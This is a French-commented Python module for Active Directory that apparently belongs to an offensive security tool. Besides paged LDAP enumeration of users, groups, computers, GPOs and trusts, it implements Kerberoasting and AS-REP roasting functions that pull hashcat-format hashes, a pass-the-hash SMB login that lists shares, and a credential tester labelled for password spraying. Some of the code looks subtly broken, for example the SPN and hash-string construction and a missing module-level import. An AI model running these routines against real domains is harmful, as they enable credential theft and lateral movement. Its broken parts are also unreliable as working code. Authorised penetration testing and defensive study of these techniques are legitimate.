"""AD Connector — communication LDAP/LDAPS native et attaque AD avec impacket.

Supporte :
- LDAP (389) et LDAPS (636)
- Authentification simple (username/password)
- Authentification NTLM (ldap3 + impacket)
- Recherches paginées (conformes aux limites AD)
- Gestion des timeouts et retries
- Kerberoasting (impacket)
- AS-REP Roasting (impacket)
- Pass-the-Hash SMB (impacket)

Dépendances :
- ldap3>=2.9.1    : pip install ldap3
- impacket>=0.12.0 : pip install impacket pycryptodome
"""

import asyncio
import contextlib
import ssl
from dataclasses import dataclass, field
from datetime import datetime
from enum import StrEnum
from typing import Any

import structlog

logger = structlog.get_logger(__name__)


# ── Exceptions ──────────────────────────────────────────────────


class ADConnectionError(Exception):
    """Erreur de connexion au contrôleur de domaine."""


class ADAuthenticationError(ADConnectionError):
    """Échec d'authentification AD."""


class ADSearchError(Exception):
    """Erreur lors d'une recherche LDAP."""


# ── Enums ───────────────────────────────────────────────────────


class ADAuthMethod(StrEnum):
    """Méthode d'authentification supportées."""

    SIMPLE = "simple"  # Bind username/password standard
    NTLM = "ntlm"  # NTLM SSP
    ANONYMOUS = "anonymous"  # Bind anonyme (limité)


class ADSearchScope(StrEnum):
    """Portée de recherche LDAP."""

    BASE = "base"  # L'objet lui-même
    ONELEVEL = "onelevel"  # Enfants directs
    SUBTREE = "subtree"  # Arborescence complète (défaut)


# ── Configuration ───────────────────────────────────────────────


@dataclass
class ADConfig:
    """Configuration de connexion Active Directory.

    Usage:
        config = ADConfig(
            server="dc.internal.corp",
            domain="internal.corp",
            username="svc_scan@internal.corp",
            password="..."
        )
    """

    server: str  # DC hostname ou IP
    domain: str  # Nom de domaine (ex: internal.corp)
    username: str | None = None  # Compte (UPN ou SAM)
    password: str | None = None  # Mot de passe
    auth_method: ADAuthMethod = ADAuthMethod.SIMPLE
    use_ssl: bool = True  # LDAPS (port 636)
    port: int | None = None  # Auto: 636 si SSL, 389 sinon
    base_dn: str | None = None  # Base DN (auto-dérivé du domaine)
    timeout: float = 30.0  # Timeout connexion (secondes)
    page_size: int = 1000  # Taille de page (limite AD = 1000)
    max_retries: int = 2  # Tentatives de reconnexion
    validate_cert: bool = False  # Valider le certificat SSL
    ca_cert_file: str | None = None  # Fichier CA pour SSL

    @property
    def effective_port(self) -> int:
        if self.port:
            return self.port
        return 636 if self.use_ssl else 389

    @property
    def effective_base_dn(self) -> str:
        if self.base_dn:
            return self.base_dn
        # Dériver du domaine : internal.corp → DC=internal,DC=corp
        parts = self.domain.split(".")
        return ",".join(f"DC={p}" for p in parts)


# ── Modèles de données AD ──────────────────────────────────────


@dataclass
class ADObject:
    """Objet AD générique (classe de base)."""

    dn: str  # Distinguished Name
    object_class: str = ""  # top, user, group, computer...
    cn: str = ""  # Common Name
    when_created: datetime | None = None
    when_changed: datetime | None = None
    description: str | None = None
    raw_attributes: dict[str, Any] = field(default_factory=dict)


@dataclass
class ADUser(ADObject):
    """Utilisateur Active Directory."""

    object_class: str = "user"
    sam_account_name: str = ""  # sAMAccountName (pre-Windows 2000)
    user_principal_name: str = ""  # UPN (user@domain)
    display_name: str = ""
    mail: str = ""
    title: str = ""
    department: str = ""
    company: str = ""
    office: str = ""
    phone: str = ""
    member_of: list[str] = field(default_factory=list)  # DNs des groupes
    primary_group_id: int = 513  # 513 = Domain Users
    user_account_control: int = 512  # UAC flags
    bad_pwd_count: int = 0
    last_logon: datetime | None = None
    pwd_last_set: datetime | None = None
    account_expires: datetime | None = None
    admin_count: int = 0  # 1 = admin protégé (SDProp)
    service_principal_names: list[str] = field(default_factory=list)  # SPNs (Kerberoastable)
    logon_count: int = 0
    home_directory: str = ""
    script_path: str = ""
    profile_path: str = ""

    @property
    def is_enabled(self) -> bool:
        """UAC ACCOUNTDISABLE = 0x0002."""
        return (self.user_account_control & 2) == 0

    @property
    def is_admin(self) -> bool:
        """Compte admin protégé par SDProp (adminCount=1)."""
        return self.admin_count == 1

    @property
    def is_kerberoastable(self) -> bool:
        """A des SPNs → vulnérable au Kerberoasting."""
        return len(self.service_principal_names) > 0

    @property
    def is_asrep_roastable(self) -> bool:
        """UAC DONT_REQ_PREAUTH = 0x400000."""
        return (self.user_account_control & 0x400000) != 0

    @property
    def is_trusted_for_delegation(self) -> bool:
        """UAC TRUSTED_FOR_DELEGATION = 0x80000."""
        return (self.user_account_control & 0x80000) != 0


@dataclass
class ADGroup(ADObject):
    """Groupe Active Directory."""

    object_class: str = "group"
    sam_account_name: str = ""
    group_type: int = -2147483646  # -2147483646 = Global Security (défaut)
    members: list[str] = field(default_factory=list)  # DNs des membres
    member_of: list[str] = field(default_factory=list)  # DNs des groupes parents
    admin_count: int = 0

    @property
    def scope(self) -> str:
        """Global, Universal, ou Domain Local.

        Bits 0-3 (masque 0xE = 1110) : 2=global, 4=domain_local, 8=universal.
        On masque directement sur la valeur négative (le complément à deux
        de Python préserve les bits bas).
        """
        masked = self.group_type & 0x0000000E
        if masked & 8:
            return "universal"
        if masked & 4:
            return "domain_local"
        if masked & 2:
            return "global"
        return "unknown"

    @property
    def is_security_group(self) -> bool:
        """Bit 31 (0x80000000) = security group."""
        return bool(self.group_type & 0x80000000)


@dataclass
class ADComputer(ADObject):
    """Ordinateur (machine) Active Directory."""

    object_class: str = "computer"
    sam_account_name: str = ""
    dns_hostname: str = ""
    operating_system: str = ""
    operating_system_version: str = ""
    operating_system_service_pack: str = ""
    member_of: list[str] = field(default_factory=list)
    user_account_control: int = 4096  # WORKSTATION_TRUST_ACCOUNT
    last_logon: datetime | None = None
    service_principal_names: list[str] = field(default_factory=list)

    @property
    def is_enabled(self) -> bool:
        return (self.user_account_control & 2) == 0

    @property
    def is_domain_controller(self) -> bool:
        """UAC SERVER_TRUST_ACCOUNT = 0x2000."""
        return (self.user_account_control & 0x2000) != 0


@dataclass
class ADOU(ADObject):
    """Unité d'organisation (Organizational Unit)."""

    object_class: str = "organizationalUnit"
    ou_name: str = ""
    gpo_links: list[str] = field(default_factory=list)  # DNs des GPOs liés


@dataclass
class ADGPO(ADObject):
    """Group Policy Object."""

    object_class: str = "groupPolicyContainer"
    display_name: str = ""
    gpo_status: str = ""  # "Enabled", "UserDisabled", etc.
    path: str = ""  # \\domain\SysVol\...
    version: int = 0


@dataclass
class ADDomain:
    """Domaine Active Directory."""

    name: str = ""  # Nom DNS (ex: internal.corp)
    netbios_name: str = ""  # Nom NetBIOS (ex: INTERNAL)
    sid: str = ""  # Domain SID
    functional_level: str = ""  # 2016, 2019...
    forest: str = ""  # Nom de la forêt
    dc_hostnames: list[str] = field(default_factory=list)


@dataclass
class ADTrust:
    """Relation de confiance inter-domaine."""

    source_domain: str = ""
    target_domain: str = ""
    direction: str = ""  # Inbound, Outbound, Bidirectional
    type: str = ""  # ParentChild, External, Forest...
    transitive: bool = False
    sid_filtering: bool = True


# ── Connecteur ──────────────────────────────────────────────────


class ADConnector:
    """Connecteur LDAP/LDAPS natif pour Active Directory.

    Usage:
        config = ADConfig(server="dc.corp.local", domain="corp.local",
                          username="admin@corp.local", password="...")
        connector = ADConnector(config)
        await connector.connect()

        # Recherche
        users = await connector.search_users("(objectClass=user)")

        await connector.close()
    """

    def __init__(self, config: ADConfig) -> None:
        self.config = config
        self._connection: Any = None  # ldap3 Connection
        self._server: Any = None  # ldap3 Server
        self._connected: bool = False
        self._bound: bool = False

    # ══════════════════════════════════════════════════════════════════
    # Connexion & Authentification LDAP
    # ══════════════════════════════════════════════════════════════════

    async def connect(self) -> None:
        """Établit la connexion au contrôleur de domaine et s'authentifie."""
        for attempt in range(self.config.max_retries + 1):
            try:
                await self._connect_internal()
                logger.info(
                    "ad_connected",
                    server=self.config.server,
                    domain=self.config.domain,
                    auth_method=self.config.auth_method.value,
                )
                return
            except ADAuthenticationError:
                raise  # Ne pas retenter si l'auth échoue
            except Exception as e:
                if attempt < self.config.max_retries:
                    logger.warning("ad_connect_retry", attempt=attempt + 1, error=str(e))
                    await asyncio.sleep(2**attempt)
                else:
                    msg = f"Échec connexion AD après {self.config.max_retries + 1} tentatives: {e}"
                    raise ADConnectionError(
                        msg,
                    ) from e

    async def _connect_internal(self) -> None:
        """Connexion interne (synchrone ldap3 exécutée dans un thread)."""
        import ldap3
        from ldap3.core.exceptions import LDAPBindError, LDAPSocketOpenError

        # ── Configurer le serveur ───────────────────────────────
        port = self.config.effective_port
        use_ssl = self.config.use_ssl

        tls_config = None
        if use_ssl:
            tls_config = ldap3.Tls(
                validate=ssl.CERT_REQUIRED if self.config.validate_cert else ssl.CERT_NONE,
                ca_certs_file=self.config.ca_cert_file,
            )

        server_kwargs = {
            "host": self.config.server,
            "port": port,
            "use_ssl": use_ssl,
            "tls": tls_config,
            "get_info": ldap3.ALL,
            "connect_timeout": self.config.timeout,
        }

        server = ldap3.Server(**server_kwargs)

        # ── Configurer la connexion ─────────────────────────────
        auth_kwargs = self._build_auth_kwargs()

        conn = ldap3.Connection(
            server,
            authentication=auth_kwargs.pop("authentication", ldap3.SIMPLE),
            user=auth_kwargs.pop("user", self.config.username),
            password=auth_kwargs.pop("password", self.config.password),
            auto_bind=False,
            receive_timeout=self.config.timeout,
            raise_exceptions=False,
        )

        # ── Bind ────────────────────────────────────────────────
        try:
            bound = conn.bind()
        except LDAPSocketOpenError as e:
            msg = (
                f"Impossible de contacter {self.config.server}:{port} — "
                f"le DC est-il joignable ? ({e})"
            )
            raise ADConnectionError(
                msg,
            ) from e
        except LDAPBindError as e:
            msg = (
                f"Authentification échouée pour {self.config.username} "
                f"sur {self.config.domain}: {e}"
            )
            raise ADAuthenticationError(
                msg,
            ) from e

        if not bound:
            result_desc = conn.result.get("description", "Unknown error")
            msg = f"Bind échoué: {result_desc}"
            raise ADAuthenticationError(
                msg,
            )

        self._server = server
        self._connection = conn
        self._connected = True
        self._bound = True

    def _build_auth_kwargs(self) -> dict:
        """Construit les kwargs d'authentification ldap3."""
        kwargs: dict = {}

        if self.config.auth_method == ADAuthMethod.SIMPLE:
            kwargs["authentication"] = "SIMPLE"  # type: ignore[assignment]
            kwargs["user"] = self.config.username
            kwargs["password"] = self.config.password

        elif self.config.auth_method == ADAuthMethod.NTLM:
            kwargs["authentication"] = "NTLM"  # type: ignore[assignment]
            kwargs["user"] = self.config.username
            kwargs["password"] = self.config.password

        elif self.config.auth_method == ADAuthMethod.ANONYMOUS:
            kwargs["authentication"] = "ANONYMOUS"  # type: ignore[assignment]

        return kwargs

    # ══════════════════════════════════════════════════════════════════
    # Fermeture & nettoyage
    # ══════════════════════════════════════════════════════════════════

    async def close(self) -> None:
        """Ferme la connexion LDAP proprement."""
        if self._connection and not self._connection.closed:
            with contextlib.suppress(Exception):
                self._connection.unbind()
        self._connected = False
        self._bound = False
        logger.info("ad_disconnected", server=self.config.server)

    @property
    def is_connected(self) -> bool:
        return self._connected and self._bound and not self._connection.closed

    # ══════════════════════════════════════════════════════════════════
    # Requêtes LDAP — helpers
    # ══════════════════════════════════════════════════════════════════

    async def search(
        self,
        search_filter: str,
        search_base: str | None = None,
        scope: ADSearchScope = ADSearchScope.SUBTREE,
        attributes: list[str] | None = None,
        max_entries: int = 0,  # 0 = illimité
    ) -> list[dict[str, Any]]:
        """Recherche LDAP générique paginée.

        Args:
            search_filter: Filtre LDAP (ex: "(objectClass=user)")
            search_base: Base DN (défaut: base du domaine)
            scope: Portée de recherche (SUBTREE par défaut)
            attributes: Attributs à récupérer (défaut: tous)
            max_entries: Limite (0 = illimité)

        Returns:
            Liste d'entrées brutes (dict DN → attributs)

        """
        self._ensure_connected()

        base = search_base or self.config.effective_base_dn
        attr_list = attributes or ldap3.ALL_ATTRIBUTES

        scope_map = {
            ADSearchScope.BASE: "BASE",
            ADSearchScope.ONELEVEL: "LEVEL",
            ADSearchScope.SUBTREE: "SUBTREE",
        }

        entries = []

        try:
            # Recherche paginée (contourne la limite AD de 1000)
            cookie = None
            page_size = self.config.page_size

            while True:
                search_args = {
                    "search_base": base,
                    "search_filter": search_filter,
                    "search_scope": scope_map[scope],
                    "attributes": attr_list,
                }

                if page_size:
                    search_args["paged_size"] = page_size
                    if cookie:
                        search_args["paged_cookie"] = cookie

                success = await asyncio.to_thread(
                    self._connection.search,
                    **search_args,
                )

                if not success:
                    error = self._connection.result.get("description", "Unknown")
                    msg = f"Recherche LDAP échouée: {error}"
                    raise ADSearchError(msg)

                for entry in self._connection.response:
                    if entry.get("dn"):
                        entries.append(entry)

                # Vérifier pagination
                cookie = (
                    self._connection.result.get("controls", {})
                    .get(
                        "1.2.840.113556.1.4.319",
                        {},
                    )
                    .get("value", {})
                    .get("cookie")
                )

                if not cookie:
                    break

                if max_entries and len(entries) >= max_entries:
                    entries = entries[:max_entries]
                    break

        except ADSearchError:
            raise
        except Exception as e:
            msg = f"Erreur lors de la recherche LDAP '{search_filter}': {e}"
            raise ADSearchError(
                msg,
            ) from e

        return entries

    async def search_users(
        self,
        extra_filter: str = "",
        attributes: list[str] | None = None,
        max_entries: int = 0,
    ) -> list[dict[str, Any]]:
        """Recherche les utilisateurs du domaine."""
        base_filter = "(&(objectClass=user)(objectCategory=person))"
        if extra_filter:
            base_filter = f"(&(objectClass=user)(objectCategory=person){extra_filter})"
        return await self.search(
            base_filter,
            attributes=attributes
            or [
                "sAMAccountName",
                "userPrincipalName",
                "displayName",
                "mail",
                "title",
                "department",
                "company",
                "physicalDeliveryOfficeName",
                "telephoneNumber",
                "memberOf",
                "primaryGroupID",
                "userAccountControl",
                "badPwdCount",
                "lastLogon",
                "pwdLastSet",
                "accountExpires",
                "adminCount",
                "servicePrincipalName",
                "logonCount",
                "homeDirectory",
                "scriptPath",
                "profilePath",
                "whenCreated",
                "whenChanged",
                "description",
                "cn",
                "distinguishedName",
            ],
            max_entries=max_entries,
        )

    async def search_groups(
        self,
        extra_filter: str = "",
        attributes: list[str] | None = None,
        max_entries: int = 0,
    ) -> list[dict[str, Any]]:
        """Recherche les groupes du domaine."""
        base_filter = "(objectClass=group)"
        if extra_filter:
            base_filter = f"(&(objectClass=group){extra_filter})"
        return await self.search(
            base_filter,
            attributes=attributes
            or [
                "sAMAccountName",
                "member",
                "memberOf",
                "groupType",
                "adminCount",
                "description",
                "whenCreated",
                "whenChanged",
                "cn",
                "distinguishedName",
            ],
            max_entries=max_entries,
        )

    async def search_computers(
        self,
        extra_filter: str = "",
        attributes: list[str] | None = None,
        max_entries: int = 0,
    ) -> list[dict[str, Any]]:
        """Recherche les ordinateurs du domaine."""
        base_filter = "(objectClass=computer)"
        if extra_filter:
            base_filter = f"(&(objectClass=computer){extra_filter})"
        return await self.search(
            base_filter,
            attributes=attributes
            or [
                "sAMAccountName",
                "dNSHostName",
                "operatingSystem",
                "operatingSystemVersion",
                "operatingSystemServicePack",
                "memberOf",
                "userAccountControl",
                "lastLogon",
                "servicePrincipalName",
                "whenCreated",
                "whenChanged",
                "cn",
                "distinguishedName",
            ],
            max_entries=max_entries,
        )

    async def search_ous(
        self,
        extra_filter: str = "",
        attributes: list[str] | None = None,
        max_entries: int = 0,
    ) -> list[dict[str, Any]]:
        """Recherche les Unités d'Organisation."""
        base_filter = "(objectClass=organizationalUnit)"
        if extra_filter:
            base_filter = f"(&(objectClass=organizationalUnit){extra_filter})"
        return await self.search(
            base_filter,
            attributes=attributes
            or [
                "ou",
                "gPLink",
                "description",
                "whenCreated",
                "whenChanged",
                "cn",
                "distinguishedName",
            ],
            max_entries=max_entries,
        )

    async def search_gpos(
        self,
        attributes: list[str] | None = None,
        max_entries: int = 0,
    ) -> list[dict[str, Any]]:
        """Recherche les GPOs du domaine."""
        return await self.search(
            "(objectClass=groupPolicyContainer)",
            search_base=f"CN=Policies,CN=System,{self.config.effective_base_dn}",
            attributes=attributes
            or [
                "displayName",
                "gPCFileSysPath",
                "versionNumber",
                "flags",
                "whenCreated",
                "whenChanged",
                "cn",
                "distinguishedName",
            ],
            max_entries=max_entries,
        )

    async def search_trusts(
        self,
        attributes: list[str] | None = None,
    ) -> list[dict[str, Any]]:
        """Recherche les relations de confiance inter-domaine."""
        return await self.search(
            "(objectClass=trustedDomain)",
            search_base=f"CN=System,{self.config.effective_base_dn}",
            attributes=attributes
            or [
                "trustPartner",
                "trustDirection",
                "trustType",
                "trustAttributes",
                "cn",
                "distinguishedName",
            ],
        )

    async def get_domain_info(self) -> dict[str, Any]:
        """Récupère les informations du domaine (RootDSE)."""
        self._ensure_connected()
        return {
            "defaultNamingContext": self._connection.server.info.naming_contexts[0]
            if self._connection.server.info.naming_contexts
            else "",
            "rootDomainNamingContext": self._connection.server.info.root_domain_naming_context
            if hasattr(self._connection.server.info, "root_domain_naming_context")
            else "",
            "configurationNamingContext": self._connection.server.info.configuration_context
            if hasattr(self._connection.server.info, "configuration_context")
            else "",
            "supportedLDAPVersion": self._connection.server.info.supported_ldap_versions,
            "dnsHostName": self._connection.server.info.other.get("dnsHostName", [""])[0],
            "ldapServiceName": self._connection.server.info.other.get("ldapServiceName", [""])[0],
            "domainControllerFunctionality": self._connection.server.info.other.get(
                "domainControllerFunctionality",
                [""],
            )[0],
            "domainFunctionality": self._connection.server.info.other.get(
                "domainFunctionality",
                [""],
            )[0],
            "forestFunctionality": self._connection.server.info.other.get(
                "forestFunctionality",
                [""],
            )[0],
            "isSynchronized": self._connection.server.info.other.get("isSynchronized", [""])[0],
            "isGlobalCatalogReady": self._connection.server.info.other.get(
                "isGlobalCatalogReady",
                [""],
            )[0],
        }

    # ── Utilitaires ─────────────────────────────────────────────

    def _ensure_connected(self) -> None:
        """Vérifie que la connexion est active."""
        if not self.is_connected:
            msg = "Non connecté au contrôleur de domaine."
            raise ADConnectionError(msg)

    async def test_credentials(
        self,
        username: str,
        password: str,
    ) -> bool:
        """Teste un couple username/password (password spraying).

        Ne modifie PAS la connexion existante.
        """
        self._check_ldap3()

        test_config = ADConfig(
            server=self.config.server,
            domain=self.config.domain,
            username=username,
            password=password,
            auth_method=ADAuthMethod.SIMPLE,
            use_ssl=self.config.use_ssl,
            timeout=10.0,
            max_retries=0,
        )

        connector = ADConnector(test_config)
        try:
            await connector.connect()
            return True
        except ADAuthenticationError:
            return False
        except ADConnectionError:
            return False
        finally:
            await connector.close()

    # ── Vérification des dépendances ──────────────────────────────

    @staticmethod
    def _check_ldap3() -> None:
        """Vérifie que ldap3 est installé, lève une erreur claire sinon."""
        try:
            import ldap3  # noqa: F401
        except ImportError:
            logger.exception(
                "ldap3_not_installed",
                message=("ldap3 n'est pas installé. Exécutez : pip install ldap3>=2.9.1"),
            )
            msg = "ldap3 n'est pas installé. Installez-le avec : pip install ldap3>=2.9.1"
            raise ADConnectionError(
                msg,
            )

    @staticmethod
    def _check_impacket() -> None:
        """Vérifie que impacket est installé, lève une erreur claire sinon.

        Corrige également une régression d'impacket 0.13.1 :
        ``LOG`` a été retiré de ``impacket.__init__`` mais les modules
        internes (``ntlm.py``, ``smb.py``) tentent toujours
        ``from impacket import LOG``. On le rétablit ici pour éviter
        un ``ImportError`` au premier appel.
        """
        try:
            import impacket  # noqa: F401
        except ImportError:
            logger.exception(
                "impacket_not_installed",
                message=(
                    "impacket n'est pas installé. Exécutez : pip install impacket pycryptodome"
                ),
            )
            msg = (
                "impacket n'est pas installé. "
                "Installez-le avec : pip install impacket pycryptodome"
            )
            raise ADConnectionError(
                msg,
            )
        # ── Correction régression impacket 0.13.1 ──────────────────
        if not hasattr(impacket, "LOG"):
            import logging  # pylint: disable=import-outside-toplevel

            impacket.LOG = logging.getLogger("impacket")

    # ══════════════════════════════════════════════════════════════════
    # Authentification NTLM / Kerberos (impacket)
    # ══════════════════════════════════════════════════════════════════

    async def authenticate_ntlm(
        self,
        username: str,
        password: str,
        domain: str | None = None,
    ) -> bool:
        """Authentifie un compte via NTLM en utilisant impacket (SMB).

        Utilise une connexion SMB au contrôleur de domaine pour valider
        les credentials NTLM. Plus fiable que ldap3 pour le NTLM pur.

        Args:
            username: Nom d'utilisateur (SAM ou UPN)
            password: Mot de passe
            domain: Domaine (défaut: config.domain)

        Returns:
            True si l'authentification réussit, False sinon

        """
        self._check_impacket()
        domain = domain or self.config.domain
        try:
            return await asyncio.to_thread(
                self._authenticate_ntlm_sync,
                username,
                password,
                domain,
            )
        except Exception as e:
            logger.warning("ntlm_auth_failed", username=username, error=str(e))
            return False

    def _authenticate_ntlm_sync(
        self,
        username: str,
        password: str,
        domain: str,
    ) -> bool:
        """Version synchrone de l'authentification NTLM via SMB."""
        from impacket.smbconnection import SessionError, SMBConnection

        try:
            conn = SMBConnection(
                remoteName=self.config.server,
                remoteHost=self.config.server,
            )
            conn.login(user=username, password=password, domain=domain)
            conn.logoff()
            return True
        except SessionError:
            return False

    # ── impacket : Kerberoasting ──────────────────────────────────

    async def kerberoast(
        self,
        target_user: str,
        domain: str | None = None,
    ) -> dict[str, Any]:
        """Effectue une attaque Kerberoasting sur un utilisateur cible.

            Demande un Ticket Granting Service (TGS) pour le SPN associé
        à l'utilisateur et extrait le hash au format hashcat.

        Args:
            target_user: sAMAccountName ou UPN de l'utilisateur cible
            domain: Domaine (défaut: config.domain)

        Returns:
            Dictionnaire avec :
            - 'hash':     Hash au format $krb5tgs$ (hashcat -m 13100)
            - 'target':   sAMAccountName ciblé
            - 'domain':   Domaine utilisé
            - 'spn':      SPN utilisé pour la requête (si disponible)
            - 'success':  True si le hash a été obtenu
            - 'error':    Message d'erreur si échec

        """
        self._check_impacket()
        domain = domain or self.config.domain
        return await asyncio.to_thread(
            self._kerberoast_sync,
            target_user,
            domain,
        )

    def _kerberoast_sync(
        self,
        target_user: str,
        domain: str,
    ) -> dict[str, Any]:
        """Version synchrone du Kerberoasting via impacket."""
        from impacket.krb5 import constants
        from impacket.krb5.kerberosv5 import KerberosError, getKerberosTGS

        result: dict[str, Any] = {
            "hash": "",
            "target": target_user,
            "domain": domain,
            "spn": "",
            "success": False,
            "error": "",
        }

        # Construire le SPN : le target_user doit être un SPN existant
        # (ex: HTTP/svc.corp.local) ou on utilise le format générique
        spn = f"{target_user}/{domain}" if "/" not in target_user else target_user

        result["spn"] = spn

        try:
            tgs, _cipher, _session_key = getKerberosTGS(
                constants.ApplicationTag.SMB,
                spn,
                host=self.config.server,
            )

            # Extraire le hash au format hashcat ($krb5tgs$)
            enc_part = tgs["enc-part"]
            etype = int(enc_part["etype"])
            cipher_text = enc_part["cipher"]

            # Construire le hash hashcat
            hash_str = f"$krb5tgs${etype}${target_user}${domain}${cipher_text.hex()}"
            result["hash"] = hash_str
            result["success"] = True

            logger.info("kerberoast_success", target=target_user, spn=spn)

        except KerberosError as e:
            result["error"] = f"Erreur Kerberos: {e}"
            logger.warning("kerberoast_failed", target=target_user, error=str(e))
        except Exception as e:
            result["error"] = f"Erreur inattendue: {e}"
            logger.exception("kerberoast_error", target=target_user, error=str(e))

        return result

    # ── impacket : AS-REP Roasting ────────────────────────────────

    async def asrep_roast(
        self,
        target_user: str,
        domain: str | None = None,
    ) -> dict[str, Any]:
        """Effectue une attaque AS-REP Roasting sur un utilisateur cible.

        Cible les utilisateurs dont le flag DONT_REQ_PREAUTH est activé.
        Demande un Ticket Granting Ticket (TGT) sans pré-authentification
        et extrait le hash au format hashcat.

        Args:
            target_user: sAMAccountName ou UPN de l'utilisateur cible
            domain: Domaine (défaut: config.domain)

        Returns:
            Dictionnaire avec :
            - 'hash':     Hash au format $krb5asrep$ (hashcat -m 18200)
            - 'target':   sAMAccountName ciblé
            - 'domain':   Domaine utilisé
            - 'success':  True si le hash a été obtenu
            - 'error':    Message d'erreur si échec

        """
        self._check_impacket()
        domain = domain or self.config.domain
        return await asyncio.to_thread(
            self._asrep_roast_sync,
            target_user,
            domain,
        )

    def _asrep_roast_sync(
        self,
        target_user: str,
        domain: str,
    ) -> dict[str, Any]:
        """Version synchrone de l'AS-REP Roasting via impacket."""
        from impacket.krb5 import constants
        from impacket.krb5.asn1 import AS_REP
        from impacket.krb5.kerberosv5 import KerberosError, sendReceive
        from impacket.krb5.types import Principal
        from pyasn1.codec.der import decoder

        result: dict[str, Any] = {
            "hash": "",
            "target": target_user,
            "domain": domain,
            "success": False,
            "error": "",
        }

        try:
            # Construire le principal de l'utilisateur cible
            principal = Principal(
                target_user,
                type=constants.PrincipalNameType.NT_PRINCIPAL.value,
            )

            # Envoyer la requête AS-REQ sans pré-authentification
            as_rep = sendReceive(
                principal,
                domain,
                host=self.config.server,
            )

            # Décoder la réponse
            decoded, _ = decoder.decode(as_rep, asn1Spec=AS_REP())

            # Extraire la partie chiffrée du TGT
            enc_part = decoded["enc-part"]
            etype = int(enc_part["etype"])
            cipher_text = enc_part["cipher"]

            # Construire le hash hashcat ($krb5asrep$)
            hash_str = f"$krb5asrep${etype}${target_user}${domain}${cipher_text.hex()}"
            result["hash"] = hash_str
            result["success"] = True

            logger.info("asrep_roast_success", target=target_user)

        except KerberosError as e:
            result["error"] = f"Erreur Kerberos: {e}"
            logger.warning("asrep_roast_failed", target=target_user, error=str(e))
        except Exception as e:
            result["error"] = f"Erreur inattendue: {e}"
            logger.exception("asrep_roast_error", target=target_user, error=str(e))

        return result

    # ── impacket : Pass-the-Hash SMB ─────────────────────────────

    async def pass_the_hash(
        self,
        target_host: str,
        username: str,
        nthash: str,
        domain: str | None = None,
    ) -> dict[str, Any]:
        """Effectue une authentification Pass-the-Hash via SMB.

        Utilise un hash NTLM (au lieu du mot de passe) pour s'authentifier
        sur une machine distante via le protocole SMB.

        Args:
            target_host: Adresse IP ou hostname de la cible
            username: Nom d'utilisateur (SAM)
            nthash: Hash NTLM (format hexadécimal, 32 caractères)
            domain: Domaine (défaut: config.domain)

        Returns:
            Dictionnaire avec :
            - 'success':     True si l'authentification réussit
            - 'hostname':    Hostname de la cible
            - 'os_info':     Informations OS (si disponibles)
            - 'error':       Message d'erreur si échec
            - 'shares':      Liste des partages SMB (si succès)

        """
        self._check_impacket()
        domain = domain or self.config.domain
        return await asyncio.to_thread(
            self._pass_the_hash_sync,
            target_host,
            username,
            nthash,
            domain,
        )

    def _pass_the_hash_sync(
        self,
        target_host: str,
        username: str,
        nthash: str,
        domain: str,
    ) -> dict[str, Any]:
        """Version synchrone du Pass-the-Hash via impacket."""
        from impacket.smbconnection import SessionError, SMBConnection

        result: dict[str, Any] = {
            "success": False,
            "hostname": target_host,
            "os_info": "",
            "shares": [],
            "error": "",
        }

        try:
            conn = SMBConnection(
                remoteName=target_host,
                remoteHost=target_host,
            )

            # Login avec le hash NTLM (seul, sans mot de passe)
            conn.login(
                user=username,
                domain=domain,
                nthash=nthash,
            )

            # Récupérer les informations OS
            with contextlib.suppress(Exception):
                result["os_info"] = conn.getServerName()

            # Énumérer les partages SMB
            try:
                shares = conn.listShares()
                for share in shares:
                    result["shares"].append(
                        {
                            "name": share["shi1_netname"][:-1],
                            "remark": share["shi1_remark"][:-1],
                        },
                    )
            except Exception:
                logger.exception("pth_share_iteration_failed")

            result["success"] = True
            conn.logoff()

            logger.info(
                "pth_success",
                target=target_host,
                username=username,
                shares_count=len(result["shares"]),
            )

        except SessionError as e:
            result["error"] = f"Échec authentification SMB: {e}"
            logger.warning("pth_failed", target=target_host, error=str(e))
        except Exception as e:
            result["error"] = f"Erreur inattendue: {e}"
            logger.exception("pth_error", target=target_host, error=str(e))

        return result

    def __repr__(self) -> str:
        state = "connected" if self.is_connected else "disconnected"
        return (
            f"ADConnector(server={self.config.server}, domain={self.config.domain}, state={state})"
        )


# ── Helpers globaux ─────────────────────────────────────────────


def parse_user_account_control(uac: int) -> dict[str, bool]:
    """Décompose les flags UserAccountControl."""
    flags = {
        "SCRIPT": 0x0001,
        "ACCOUNTDISABLE": 0x0002,
        "HOMEDIR_REQUIRED": 0x0008,
        "LOCKOUT": 0x0010,
        "PASSWD_NOTREQD": 0x0020,
        "PASSWD_CANT_CHANGE": 0x0040,
        "ENCRYPTED_TEXT_PWD_ALLOWED": 0x0080,
        "TEMP_DUPLICATE_ACCOUNT": 0x0100,
        "NORMAL_ACCOUNT": 0x0200,
        "INTERDOMAIN_TRUST_ACCOUNT": 0x0800,
        "WORKSTATION_TRUST_ACCOUNT": 0x1000,
        "SERVER_TRUST_ACCOUNT": 0x2000,
        "DONT_EXPIRE_PASSWORD": 0x10000,
        "MNS_LOGON_ACCOUNT": 0x20000,
        "SMARTCARD_REQUIRED": 0x40000,
        "TRUSTED_FOR_DELEGATION": 0x80000,
        "NOT_DELEGATED": 0x100000,
        "USE_DES_KEY_ONLY": 0x200000,
        "DONT_REQ_PREAUTH": 0x400000,
        "PASSWORD_EXPIRED": 0x800000,
        "TRUSTED_TO_AUTH_FOR_DELEGATION": 0x1000000,
        "PARTIAL_SECRETS_ACCOUNT": 0x4000000,
    }
    return {name: bool(uac & mask) for name, mask in flags.items()}


FUNCTIONAL_LEVEL_MAP: dict[str, str] = {
    "0": "2000",
    "1": "2003 Interim",
    "2": "2003",
    "3": "2008",
    "4": "2008 R2",
    "5": "2012",
    "6": "2012 R2",
    "7": "2016",
    "10": "2025",
}
"""Mapping niveau fonctionnel AD → version Windows Server."""


TRUST_DIRECTION_MAP: dict[str, str] = {
    "0": "Disabled",
    "1": "Inbound",
    "2": "Outbound",
    "3": "Bidirectional",
}

TRUST_TYPE_MAP: dict[str, str] = {
    "1": "Downlevel (NT4)",
    "2": "Uplevel (AD)",
    "3": "MIT Realm",
    "4": "DCE",
}

TRUST_ATTR_NON_TRANSITIVE = 0x00000001
TRUST_ATTR_UPLEVEL_ONLY = 0x00000002
TRUST_ATTR_QUARANTINED_DOMAIN = 0x00000004
TRUST_ATTR_FOREST_TRANSITIVE = 0x00000008
TRUST_ATTR_CROSS_ORGANIZATION = 0x00000010
TRUST_ATTR_WITHIN_FOREST = 0x00000020
TRUST_ATTR_TREAT_AS_EXTERNAL = 0x00000040
